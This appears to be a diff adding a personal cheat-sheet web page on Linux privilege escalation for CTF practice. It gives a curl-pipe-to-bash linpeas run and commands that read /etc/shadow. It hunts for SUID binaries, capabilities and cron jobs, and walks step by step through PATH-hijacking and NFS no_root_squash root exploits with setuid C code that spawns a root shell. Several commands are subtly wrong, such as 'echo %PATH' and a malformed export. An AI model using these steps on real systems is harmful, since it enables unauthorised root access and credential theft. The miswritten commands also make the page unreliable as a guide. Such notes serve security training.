@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/styles/miscStyles.css">
+    <link href="/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/styles/prism/prism.js"></script>
+
+    <title>Minimalist Webpage</title>
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/components/navbar.js"></script>
+    
+    <div id="navbar-container"></div>
+    <div class="main-container">
+        <div class="sidebar">
+            <h3>Quick content</h3>
+            <ul id="sidebar-menu"></ul>
+        </div>
+
+        <div class="notion-container">
+            <div class="notion-header">
+                <h1>Privilege Scalation</h1>
+            </div>
+
+                <div class="notion-body">
+                    <h2 id="Automation">Automation</h2>
+                    <ul>
+                        <h3> Linpeas.sh </h3>
+                        <pre><code class="language-bash">curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Enumeration">Enumeration</h2>
+                    <ul>
+                        <h3> Check permisions </h3>
+                        <pre><code class="language-bash">hostname</code></pre>
+                        <pre><code class="language-bash">ps</code></pre>
+                        <pre><code class="language-bash">env</code></pre>
+                        <pre><code class="language-bash">ifconfig</code></pre>
+                        <pre><code class="language-bash">id</code></pre>
+                        <pre><code class="language-bash">cat /etc/passwd</code></pre>
+                        <pre><code class="language-bash">cat /etc/shadow</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Sudo & SUID">Sudo & SUID</h2>
+                    <ul>
+                        <h3> Watch out for env_keep+=LD_PRELOAD </h3>
+                        <pre><code class="language-bash">sudo -l</code></pre>
+                        <h3> SUID propietary execution </h3>                          
+                        <pre><code class="language-bash">find / -type f -perm -4000 2>/dev/null</code></pre>
+                        <h3>Find world-executable folders </h3>
+                        <pre><code class="language-bash">find / -perm -o w -type d 2>/dev/null</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Capabilities">Capabilities</h2>
+                    <ul>
+                        <h3> Check for caps </h3>
+                        <pre><code class="language-bash">getcap -r / 2>/dev/null</code></pre>
+                        <p> Sometimes this command will not work so you have to find the binary manually</p>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Cron Jobs">Cron Jobs</h2>
+                    <ul>
+                        <h3> Check for cronjobs </h3>
+                        <pre><code class="language-bash">cat /etc/crontab</code></pre>
+                        <pre><code class="language-bash">/etc/cron.d/</code></pre>
+                        <h3> Scheduled cronjobs </h3>
+                        <pre><code class="language-bash">/etc/cron.hourly/</code></pre>
+                        <pre><code class="language-bash">/etc/cron.daily/</code></pre>
+                        <pre><code class="language-bash">/etc/cron.weekly/</code></pre>
+                        <pre><code class="language-bash">/etc/cron.monthly/</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Privielge scalation: Path">Privielge scalation: Path</h2>
+                    <ul>
+                        <h3> Steps </h3>
+                        <p> ⚠️WARNING!! This process may vary depending of the CTF</p>
+                        <h4> 1. Explore $PATH variable and look for a directory where you can write</h4>
+                        <pre><code class="language-bash">echo %PATH</code></pre>
+                        <h4> 2. Write a simple script</h4>
+                        <pre><code class="language-c">#include &lt;unistd.h&gt;
+void main(){
+    setuid(0);
+    setgid(0);
+    system("thm");
+}    </code></pre>
+                        <h4> 3. Compile the script</h4>
+                        <pre><code class="language-bash">gcc path_exp.c -o exploit -w</code></pre>
+                        <pre><code class="language-bash">chmod +s exploit</code></pre>
+                        <h4> 4. Find for a writeable folder under path structure</h4>
+                        <pre><code class="language-bash">find / -writable 2>/dev/null</code></pre>
+                        <h4> 4.1. In case you can't find a directory which is un  $PATH variable you can add your own with the following command</h4>
+                        <pre><code class="language-bash">export PATH /tmp:$PATH</code></pre>
+                        <h4> 5. Create the exploit to become root, must be with the same name as the C script </h4>
+                        <pre><code class="language-bash">echo "/bin/bash" > thm</code></pre>
+                        <pre><code class="language-bash">chmod 777 thm</code></pre>
+                        <h4> 6. Run the script </h4>
+                        <pre><code class="language-bash">/exploit</code></pre>
+                    </ul> 
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Privilege scalation: NFS">Privilege scalation: NFS</h2>
+                    <ul>
+                        <h3> Steps </h3>
+                        <h4> 1. Check for "no_root_squash" in /etc/exports file </h4>
+                        <pre><code class="language-bash">cat /etc/exports</code></pre>
+                        <h4> 2. Write a simple script</h4>
+                        <pre><code class="language-c">#include &lt;unistd.h&gt;
+int main(){
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}    </code></pre>
+                        <h4> 3. Compile the script</h4>
+                        <pre><code class="language-bash">gcc path_exp.c -o exploit -w</code></pre>                 
+                        <pre><code class="language-bash">chmod +s </code></pre>
+                        <h4> 4. Run script</h4>
+                        <pre><code class="language-bash">./exploit</code></pre>                 
+                    </ul> 
+                </div>
+
+
+                <div class="notion-body">
+                    <h2 id="Networking">Networking</h2>
+                    <ul>
+                        <h3> Check for interfaces </h3>
+                        <pre><code class="language-bash">netstat -tuln</code></pre>
+                        <p> In some cases you can find local services running or other targets where you can pivot </p>
+                    </ul> 
+                </div>
+
+
+                <div class="notion-body">
+                    <h2 id="Kernel exploits">Kernel exploits</h2>
+                    <p>Based on the information gathered during enumration phase search for kernel exploit using the <b>kernel version</b> or the <b>operating system version</b></p>
+                </div>
+
+        </div>
+    </div>
+</body>
+
+<script>
+        
+    function generateMenu(){
+        const headers = document.querySelectorAll('.notion-container h2');
+        const sidebarList = document.querySelector('#sidebar-menu');
+
+        headers.forEach(header => {
+            const listItem = document.createElement('li');
+            const link = document.createElement('a');
+            link.textContent = header.textContent;
+            console.log(header.textContent);
+            link.setAttribute('href', `#${header.textContent}`);
+            listItem.appendChild(link);
+            sidebarList.appendChild(listItem);
+        });
+    }
+
+    // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
+    window.addEventListener('load', generateMenu);
+</script>
+</html>
